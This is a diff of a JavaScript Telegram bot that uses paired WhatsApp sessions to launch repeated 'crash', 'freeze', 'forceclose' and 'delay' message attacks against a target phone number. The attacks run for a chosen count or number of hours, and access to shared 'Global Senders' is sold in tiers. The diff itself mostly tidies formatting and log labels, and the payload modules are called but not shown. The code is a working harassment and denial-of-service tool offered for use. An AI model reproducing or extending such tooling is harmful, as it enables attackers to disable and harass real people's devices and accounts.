+<b>📱 Sender</b>
 /reqpair 62xxx — pair
 /delpair 62xxx
 /listsender
 /delsender all
-</blockquote>
-<blockquote><b>📢 Broadcast</b>
+
+<b>📢 Broadcast</b>
 /broadcast msg — TG broadcast
 /bcgroup msg — WA to all groups
-</blockquote>
-<blockquote><b>💥 Bug Menu (/bug_menu)</b>
-All bugs now support <b>Global Senders</b> for SVIP/GroupPremium
-/free users need own pair
-</blockquote>
+
+<b>💥 Bug Menu (/bug_menu)</b>
+All bugs support Global Senders for SVIP/GroupPremium
+
 <i>Online: ${uptime}</i>`;
             S7.sendMessage(chatId, txt, {parse_mode:'HTML'});
         });
-      
-                                        SYLoVe('crashfinity', async (msg) => {
+
+        SYLoVe('crashfinity', async (msg) => {
             const chatId = msg.chat.id.toString();
             const userId = msg.from.id.toString();
             const args = msg.text.split(' ');
             const targetNum = args[1];
-            
-            const s7CM = args[0].replace('/', '/').replace('.', ''); 
+            const s7CM = args[0].replace('/', '/').replace('.', '');
 
             if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
-    const _senders = getAvailableSenders(chatId, userId);
-    if (!_senders || _senders.length === 0) {
-        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, {
+            const _senders = getAvailableSenders(chatId, userId);
+            if (!_senders || _senders.length === 0) {
+                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Sender available.\n\n<b>Own:</b> use /reqpair to pair your number\n<b>SVIP/GroupPremium:</b> can use Global Senders automatically (no pair needed).\n\nTotal Global Senders: '+getGlobalSenders().length, {
             parse_mode: 'HTML'
             });
-    }
+            }
 
             if (!targetNum) {
                 return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: ${s7CM} +919876543210`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -2038,17 +1938,16 @@ All bugs now support <b>Global Senders</b> for SVIP/GroupPremium
             const senderNum = randomSession.num;
 
             try {
-
                 log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
-                
-                if (typeof CrashLogic.crashfinity === 'function') {
-                    await CrashLogic.crashfinity(client, targetJid);
+
+                if (typeof CrashInfinity.crashnew === 'function') {
+                    await CrashInfinity.crashnew(client, targetJid);
                 } else {
                     throw new Error(`Function not found in ${s7CM}.js`);
                 }
 
-                const SYLoves = BvgSYLoVe(cleanTarget)                                
-                await S7.sendPhoto(chatId, botConfig.logo, { 
+                const SYLoves = BvgSYLoVe(cleanTarget, senderNum)
+                await S7.sendPhoto(chatId, botConfig.logo, {
                     caption: SYLoves,
                     parse_mode: 'HTML'
                 });
@@ -2056,11 +1955,11 @@ All bugs now support <b>Global Senders</b> for SVIP/GroupPremium
             } catch (err) {
                 log('error', `${s7CM}`, err.message);
                 S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
         });
-        
+
 async function Rajufcrich(client, targetJid) {
     try {
         await client.relayMessage(targetJid, {
@@ -2181,14 +2080,13 @@ SYLoVe(['xgroup', 'groupui'], async (msg) => {
             `Calling ${s7CM} on ${targetJid} via ${senderNum} [${getUserTier(userId)>=3?'GLOBAL':'OWN'}]`
         );
 
-        const SYLovesCap = BvgSYLoVe(targetJid);
+        const SYLovesCap = BvgSYLoVe(targetJid, senderNum);
 
         await S7.sendPhoto(chatId, botConfig.logo, {
             caption: SYLovesCap,
             parse_mode: 'HTML'
         });
 
-        // Freeze IOS - Global Sender support
         try {
             if (typeof FrezeIOS === 'function') {
                 await FrezeIOS(client, targetJid);
@@ -2214,7 +2112,7 @@ SYLoVe(['crashdroid', 'killsystem'], async (msg) => {
     const userId = msg.from.id.toString();
     const args = msg.text.split(' ');
 
-    const s7CM = args[0].replace('/', '/').replace('.', ''); 
+    const s7CM = args[0].replace('/', '/').replace('.', '');
 
     if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
     const _senders = getAvailableSenders(chatId, userId);
@@ -2228,7 +2126,7 @@ SYLoVe(['crashdroid', 'killsystem'], async (msg) => {
         return S7.sendMessage(
             chatId,
             `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 
@@ -2240,10 +2138,9 @@ SYLoVe(['crashdroid', 'killsystem'], async (msg) => {
     const senderNum = randomSession.num;
 
     try {
-
         log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
-        
-        const SYLoves = BvgSYLoVe(cleanTarget);
+
+        const SYLoves = BvgSYLoVe(cleanTarget, senderNum);
         await S7.sendPhoto(chatId, botConfig.logo, {
             caption: SYLoves,
             parse_mode: 'HTML'
@@ -2255,7 +2152,7 @@ SYLoVe(['crashdroid', 'killsystem'], async (msg) => {
             const count = parseInt(args[3]);
             if (!count || count <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -2279,7 +2176,7 @@ SYLoVe(['crashdroid', 'killsystem'], async (msg) => {
             const hours = parseInt(args[2]);
             if (!hours || hours <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -2302,7 +2199,7 @@ SYLoVe(['crashdroid', 'killsystem'], async (msg) => {
     } catch (err) {
         log('error', s7CM, err.message);
         S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 });
@@ -2312,7 +2209,7 @@ SYLoVe(['nullfreeze'], async (msg) => {
     const userId = msg.from.id.toString();
     const args = msg.text.split(' ');
 
-    const s7CM = args[0].replace('/', '/').replace('.', ''); 
+    const s7CM = args[0].replace('/', '/').replace('.', '');
 
     if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
     const _senders = getAvailableSenders(chatId, userId);
@@ -2326,7 +2223,7 @@ SYLoVe(['nullfreeze'], async (msg) => {
         return S7.sendMessage(
             chatId,
             `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 
@@ -2338,10 +2235,9 @@ SYLoVe(['nullfreeze'], async (msg) => {
     const senderNum = randomSession.num;
 
     try {
-
         log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
-        
-        const SYLoves = BvgSYLoVe(cleanTarget);
+
+        const SYLoves = BvgSYLoVe(cleanTarget, senderNum);
         await S7.sendPhoto(chatId, botConfig.logo, {
             caption: SYLoves,
             parse_mode: 'HTML'
@@ -2353,7 +2249,7 @@ SYLoVe(['nullfreeze'], async (msg) => {
             const count = parseInt(args[3]);
             if (!count || count <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -2377,7 +2273,7 @@ SYLoVe(['nullfreeze'], async (msg) => {
             const hours = parseInt(args[2]);
             if (!hours || hours <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -2400,7 +2296,7 @@ SYLoVe(['nullfreeze'], async (msg) => {
     } catch (err) {
         log('error', s7CM, err.message);
         S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 });
@@ -2410,7 +2306,7 @@ SYLoVe(['forceandro'], async (msg) => {
     const userId = msg.from.id.toString();
     const args = msg.text.split(' ');
 
-    const s7CM = args[0].replace('/', '/').replace('.', ''); 
+    const s7CM = args[0].replace('/', '/').replace('.', '');
 
     if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
     const _senders = getAvailableSenders(chatId, userId);
@@ -2424,7 +2320,7 @@ SYLoVe(['forceandro'], async (msg) => {
         return S7.sendMessage(
             chatId,
             `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 
@@ -2436,10 +2332,9 @@ SYLoVe(['forceandro'], async (msg) => {
     const senderNum = randomSession.num;
 
     try {
-
         log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
-        
-        const SYLoves = BvgSYLoVe(cleanTarget);
+
+        const SYLoves = BvgSYLoVe(cleanTarget, senderNum);
         await S7.sendPhoto(chatId, botConfig.logo, {
             caption: SYLoves,
             parse_mode: 'HTML'
@@ -2451,7 +2346,7 @@ SYLoVe(['forceandro'], async (msg) => {
             const count = parseInt(args[3]);
             if (!count || count <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -2475,7 +2370,7 @@ SYLoVe(['forceandro'], async (msg) => {
             const hours = parseInt(args[2]);
             if (!hours || hours <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -2498,7 +2393,7 @@ SYLoVe(['forceandro'], async (msg) => {
     } catch (err) {
         log('error', s7CM, err.message);
         S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 });
@@ -2507,7 +2402,7 @@ SYLoVe(['forceperma'], async (msg) => {
     const chatId = msg.chat.id.toString();
     const userId = msg.from.id.toString();
     const args = msg.text.split(' ');
-    const s7CM = args[0].replace('/', '/').replace('.', ''); 
+    const s7CM = args[0].replace('/', '/').replace('.', '');
     if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
     const _avail = getAvailableSenders(chatId, userId);
     if (!_avail || _avail.length === 0) {
@@ -2524,7 +2419,7 @@ SYLoVe(['forceperma'], async (msg) => {
     const forcePerma = require(SYLoves + 'forceperma');
     try {
         log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum} [${getUserTier(userId)>=3?'GLOBAL':'OWN'}]`);
-        const SYLovesCap = BvgSYLoVe(cleanTarget);
+        const SYLovesCap = BvgSYLoVe(cleanTarget, senderNum);
         await S7.sendPhoto(chatId, botConfig.logo, { caption: SYLovesCap, parse_mode: 'HTML' });
         const delayMs = 2000;
         if (args[2] === 'only') {
@@ -2555,7 +2450,7 @@ SYLoVe(['delaynull'], async (msg) => {
     const userId = msg.from.id.toString();
     const args = msg.text.split(' ');
 
-    const s7CM = args[0].replace('/', '/').replace('.', ''); 
+    const s7CM = args[0].replace('/', '/').replace('.', '');
 
     if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
     const _senders = getAvailableSenders(chatId, userId);
@@ -2569,7 +2464,7 @@ SYLoVe(['delaynull'], async (msg) => {
         return S7.sendMessage(
             chatId,
             `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 
@@ -2581,10 +2476,9 @@ SYLoVe(['delaynull'], async (msg) => {
     const senderNum = randomSession.num;
 
     try {
-
         log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
-        
-        const SYLoves = BvgSYLoVe(cleanTarget);
+
+        const SYLoves = BvgSYLoVe(cleanTarget, senderNum);
         await S7.sendPhoto(chatId, botConfig.logo, {
             caption: SYLoves,
             parse_mode: 'HTML'
@@ -2596,7 +2490,7 @@ SYLoVe(['delaynull'], async (msg) => {
             const count = parseInt(args[3]);
             if (!count || count <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -2620,7 +2514,7 @@ SYLoVe(['delaynull'], async (msg) => {
             const hours = parseInt(args[2]);
             if (!hours || hours <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -2643,7 +2537,7 @@ SYLoVe(['delaynull'], async (msg) => {
     } catch (err) {
         log('error', s7CM, err.message);
         S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 });
@@ -2653,7 +2547,7 @@ SYLoVe(['ghostdelay'], async (msg) => {
     const userId = msg.from.id.toString();
     const args = msg.text.split(' ');
 
-    const s7CM = args[0].replace('/', '/').replace('.', ''); 
+    const s7CM = args[0].replace('/', '/').replace('.', '');
 
     if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
     const _senders = getAvailableSenders(chatId, userId);
@@ -2667,7 +2561,7 @@ SYLoVe(['ghostdelay'], async (msg) => {
         return S7.sendMessage(
             chatId,
             `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 
@@ -2679,10 +2573,9 @@ SYLoVe(['ghostdelay'], async (msg) => {
     const senderNum = randomSession.num;
 
     try {
-
         log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
-        
-        const SYLoves = BvgSYLoVe(cleanTarget);
+
+        const SYLoves = BvgSYLoVe(cleanTarget, senderNum);
         await S7.sendPhoto(chatId, botConfig.logo, {
             caption: SYLoves,
             parse_mode: 'HTML'
@@ -2694,7 +2587,7 @@ SYLoVe(['ghostdelay'], async (msg) => {
             const count = parseInt(args[3]);
             if (!count || count <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -2710,7 +2603,7 @@ SYLoVe(['ghostdelay'], async (msg) => {
                     await ghostdelayLogic.ghostdelay(client, targetJid);
                     sent++;
                 } catch (err) {
-                    console.log(`[killsystem only] error: ${err.message}`);
+                    console.log(`[ghostdelay only] error: ${err.message}`);
                 }
             }, delayMs);
 
@@ -2718,7 +2611,7 @@ SYLoVe(['ghostdelay'], async (msg) => {
             const hours = parseInt(args[2]);
             if (!hours || hours <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -2741,7 +2634,7 @@ SYLoVe(['ghostdelay'], async (msg) => {
     } catch (err) {
         log('error', s7CM, err.message);
         S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 });
@@ -2751,7 +2644,7 @@ SYLoVe(['forcehard'], async (msg) => {
     const userId = msg.from.id.toString();
     const args = msg.text.split(' ');
 
-    const s7CM = args[0].replace('/', '/').replace('.', ''); 
+    const s7CM = args[0].replace('/', '/').replace('.', '');
 
     if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
     const _senders = getAvailableSenders(chatId, userId);
@@ -2765,7 +2658,7 @@ SYLoVe(['forcehard'], async (msg) => {
         return S7.sendMessage(
             chatId,
             `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 
@@ -2777,10 +2670,9 @@ SYLoVe(['forcehard'], async (msg) => {
     const senderNum = randomSession.num;
 
     try {
-
         log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
-        
-        const SYLoves = BvgSYLoVe(cleanTarget);
+
+        const SYLoves = BvgSYLoVe(cleanTarget, senderNum);
         await S7.sendPhoto(chatId, botConfig.logo, {
             caption: SYLoves,
             parse_mode: 'HTML'
@@ -2792,7 +2684,7 @@ SYLoVe(['forcehard'], async (msg) => {
             const count = parseInt(args[3]);
             if (!count || count <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -2808,7 +2700,7 @@ SYLoVe(['forcehard'], async (msg) => {
                     await FcHard.FcHard(client, targetJid);
                     sent++;
                 } catch (err) {
-                    console.log(`[killsystem only] error: ${err.message}`);
+                    console.log(`[forcehard only] error: ${err.message}`);
                 }
             }, delayMs);
 
@@ -2816,7 +2708,7 @@ SYLoVe(['forcehard'], async (msg) => {
             const hours = parseInt(args[2]);
             if (!hours || hours <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -2831,7 +2723,7 @@ SYLoVe(['forcehard'], async (msg) => {
                 try {
                     await FcHard.FcHard(client, targetJid);
                 } catch (err) {
-                    console.log(`[force infinity time] error: ${err.message}`);
+                    console.log(`[forcehard time] error: ${err.message}`);
                 }
             }, delayMs);
         }
@@ -2839,7 +2731,7 @@ SYLoVe(['forcehard'], async (msg) => {
     } catch (err) {
         log('error', s7CM, err.message);
         S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 });
@@ -2849,7 +2741,7 @@ SYLoVe(['forceinfinity'], async (msg) => {
     const userId = msg.from.id.toString();
     const args = msg.text.split(' ');
 
-    const s7CM = args[0].replace('/', '/').replace('.', ''); 
+    const s7CM = args[0].replace('/', '/').replace('.', '');
 
     if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
     const _senders = getAvailableSenders(chatId, userId);
@@ -2863,7 +2755,7 @@ SYLoVe(['forceinfinity'], async (msg) => {
         return S7.sendMessage(
             chatId,
             `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 
@@ -2875,10 +2767,9 @@ SYLoVe(['forceinfinity'], async (msg) => {
     const senderNum = randomSession.num;
 
     try {
-
         log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
-        
-        const SYLoves = BvgSYLoVe(cleanTarget);
+
+        const SYLoves = BvgSYLoVe(cleanTarget, senderNum);
         await S7.sendPhoto(chatId, botConfig.logo, {
             caption: SYLoves,
             parse_mode: 'HTML'
@@ -2890,7 +2781,7 @@ SYLoVe(['forceinfinity'], async (msg) => {
             const count = parseInt(args[3]);
             if (!count || count <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -2906,7 +2797,7 @@ SYLoVe(['forceinfinity'], async (msg) => {
                     await FcNew.FcNew(client, targetJid);
                     sent++;
                 } catch (err) {
-                    console.log(`[killsystem only] error: ${err.message}`);
+                    console.log(`[forceinfinity only] error: ${err.message}`);
                 }
             }, delayMs);
 
@@ -2914,7 +2805,7 @@ SYLoVe(['forceinfinity'], async (msg) => {
             const hours = parseInt(args[2]);
             if (!hours || hours <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -2929,7 +2820,7 @@ SYLoVe(['forceinfinity'], async (msg) => {
                 try {
                     await FcNew.FcNew(client, targetJid);
                 } catch (err) {
-                    console.log(`[force infinity time] error: ${err.message}`);
+                    console.log(`[forceinfinity time] error: ${err.message}`);
                 }
             }, delayMs);
         }
@@ -2937,7 +2828,7 @@ SYLoVe(['forceinfinity'], async (msg) => {
     } catch (err) {
         log('error', s7CM, err.message);
         S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 });
@@ -2947,7 +2838,7 @@ SYLoVe(['delayinfinite'], async (msg) => {
     const userId = msg.from.id.toString();
     const args = msg.text.split(' ');
 
-    const s7CM = args[0].replace('/', '/').replace('.', ''); 
+    const s7CM = args[0].replace('/', '/').replace('.', '');
 
     if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
     const _senders = getAvailableSenders(chatId, userId);
@@ -2961,7 +2852,7 @@ SYLoVe(['delayinfinite'], async (msg) => {
         return S7.sendMessage(
             chatId,
             `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 
@@ -2973,10 +2864,9 @@ SYLoVe(['delayinfinite'], async (msg) => {
     const senderNum = randomSession.num;
 
     try {
-
         log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
-        
-        const SYLoves = BvgSYLoVe(cleanTarget);
+
+        const SYLoves = BvgSYLoVe(cleanTarget, senderNum);
         await S7.sendPhoto(chatId, botConfig.logo, {
             caption: SYLoves,
             parse_mode: 'HTML'
@@ -2988,7 +2878,7 @@ SYLoVe(['delayinfinite'], async (msg) => {
             const count = parseInt(args[3]);
             if (!count || count <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -3004,7 +2894,7 @@ SYLoVe(['delayinfinite'], async (msg) => {
                     await CrashInfinity.crashnew(client, targetJid);
                     sent++;
                 } catch (err) {
-                    console.log(`[killsystem only] error: ${err.message}`);
+                    console.log(`[delayinfinite only] error: ${err.message}`);
                 }
             }, delayMs);
 
@@ -3012,7 +2902,7 @@ SYLoVe(['delayinfinite'], async (msg) => {
             const hours = parseInt(args[2]);
             if (!hours || hours <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -3035,7 +2925,7 @@ SYLoVe(['delayinfinite'], async (msg) => {
     } catch (err) {
         log('error', s7CM, err.message);
         S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 });
@@ -3045,7 +2935,7 @@ SYLoVe(['delayinfinity'], async (msg) => {
     const userId = msg.from.id.toString();
     const args = msg.text.split(' ');
 
-    const s7CM = args[0].replace('/', '/').replace('.', ''); 
+    const s7CM = args[0].replace('/', '/').replace('.', '');
 
     if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
     const _senders = getAvailableSenders(chatId, userId);
@@ -3059,7 +2949,7 @@ SYLoVe(['delayinfinity'], async (msg) => {
         return S7.sendMessage(
             chatId,
             `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 
@@ -3071,10 +2961,9 @@ SYLoVe(['delayinfinity'], async (msg) => {
     const senderNum = randomSession.num;
 
     try {
-
         log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
-        
-        const SYLoves = BvgSYLoVe(cleanTarget);
+
+        const SYLoves = BvgSYLoVe(cleanTarget, senderNum);
         await S7.sendPhoto(chatId, botConfig.logo, {
             caption: SYLoves,
             parse_mode: 'HTML'
@@ -3086,7 +2975,7 @@ SYLoVe(['delayinfinity'], async (msg) => {
             const count = parseInt(args[3]);
             if (!count || count <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -3102,7 +2991,7 @@ SYLoVe(['delayinfinity'], async (msg) => {
                     await delayinfinityLogic.delayinfinity(client, targetJid);
                     sent++;
                 } catch (err) {
-                    console.log(`[killsystem only] error: ${err.message}`);
+                    console.log(`[delayinfinity only] error: ${err.message}`);
                 }
             }, delayMs);
 
@@ -3110,7 +2999,7 @@ SYLoVe(['delayinfinity'], async (msg) => {
             const hours = parseInt(args[2]);
             if (!hours || hours <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -3133,7 +3022,7 @@ SYLoVe(['delayinfinity'], async (msg) => {
     } catch (err) {
         log('error', s7CM, err.message);
         S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 });
@@ -3143,7 +3032,7 @@ SYLoVe(['Delayhard'], async (msg) => {
     const userId = msg.from.id.toString();
     const args = msg.text.split(' ');
 
-    const s7CM = args[0].replace('/', '/').replace('.', ''); 
+    const s7CM = args[0].replace('/', '/').replace('.', '');
 
     if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
     const _senders = getAvailableSenders(chatId, userId);
@@ -3157,7 +3046,7 @@ SYLoVe(['Delayhard'], async (msg) => {
         return S7.sendMessage(
             chatId,
             `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 
@@ -3169,10 +3058,9 @@ SYLoVe(['Delayhard'], async (msg) => {
     const senderNum = randomSession.num;
 
     try {
-
         log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
-        
-        const SYLoves = BvgSYLoVe(cleanTarget);
+
+        const SYLoves = BvgSYLoVe(cleanTarget, senderNum);
         await S7.sendPhoto(chatId, botConfig.logo, {
             caption: SYLoves,
             parse_mode: 'HTML'
@@ -3184,7 +3072,7 @@ SYLoVe(['Delayhard'], async (msg) => {
             const count = parseInt(args[3]);
             if (!count || count <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -3200,7 +3088,7 @@ SYLoVe(['Delayhard'], async (msg) => {
                     await crashnoclickLogic.crashnoclick(client, targetJid);
                     sent++;
                 } catch (err) {
-                    console.log(`[killsystem only] error: ${err.message}`);
+                    console.log(`[Delayhard only] error: ${err.message}`);
                 }
             }, delayMs);
 
@@ -3208,7 +3096,7 @@ SYLoVe(['Delayhard'], async (msg) => {
             const hours = parseInt(args[2]);
             if (!hours || hours <= 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -3231,18 +3119,17 @@ SYLoVe(['Delayhard'], async (msg) => {
     } catch (err) {
         log('error', s7CM, err.message);
         S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 });
-
 
 SYLoVe(['Forcebeta', 'clickBeta'], async (msg) => {
     const chatId = msg.chat.id.toString();
     const userId = msg.from.id.toString();
     const args = msg.text.split(' ');
 
-    const s7CM = args[0].replace('/', '/').replace('.', ''); 
+    const s7CM = args[0].replace('/', '/').replace('.', '');
 
     if (!LoveGlobalState(userId, chatId)) return sendSYLove(S7, chatId);
     const _senders = getAvailableSenders(chatId, userId);
@@ -3256,7 +3143,7 @@ SYLoVe(['Forcebeta', 'clickBeta'], async (msg) => {
         return S7.sendMessage(
             chatId,
             `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
     }
 
